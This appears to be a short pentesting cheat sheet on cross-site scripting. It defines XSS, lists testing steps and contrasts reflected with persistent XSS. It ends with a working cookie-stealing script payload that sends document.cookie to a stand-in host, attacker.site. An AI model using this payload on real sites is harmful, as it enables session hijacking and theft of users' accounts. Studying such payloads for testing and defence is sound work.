# Cross Site Scripting

Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.

1. Find a reflection point
2. Test with <i> tag
3. Test with HTML/JavaScript code (alert('XSS'))

- Reflected XSS = Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload
- Persistent XSS = Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post

## Cookie stealing via XSS 
`<script>
var i = new Image(); i.src="http://attacker.site/log.php?cookie="+escape(document.cookie)</script>`
